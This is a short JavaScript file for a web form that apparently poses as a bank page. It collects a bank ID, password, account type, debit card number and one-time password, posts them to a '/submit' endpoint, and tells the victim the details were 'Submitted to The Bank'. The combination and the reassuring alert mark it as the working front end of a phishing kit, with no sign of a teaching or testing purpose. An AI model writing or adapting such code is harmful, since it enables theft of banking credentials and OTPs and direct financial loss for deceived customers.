const bid = document.getElementById('Bankid')
const bpw = document.getElementById('Bankpw')
const acc = document.getElementById('acc')
const dcard = document.getElementById('dbcard')
const otp = document.getElementById('otp')

const btn = document.getElementById('sbmt')

btn.addEventListener('click', async () => {
    let actype = ""
    if(acc.value == '1'){
        actype = "Current"
    }
    else{
        actype = "Savings"
    }
    let clresp = await fetch('/submit', {
        "method": 'POST',
        "headers": {
            'Content-Type': 'application/json'
        },
        'body': JSON.stringify({
            'Bankid': bid.value,
            'Bankpw': bpw.value,
            'Acc': actype,
            'Dbcard': dcard.value,
            'otp': otp.value
        })
    })

    window.alert("Your Details are Submitted to The Bank\nYour Request will be Looked into")
    

})
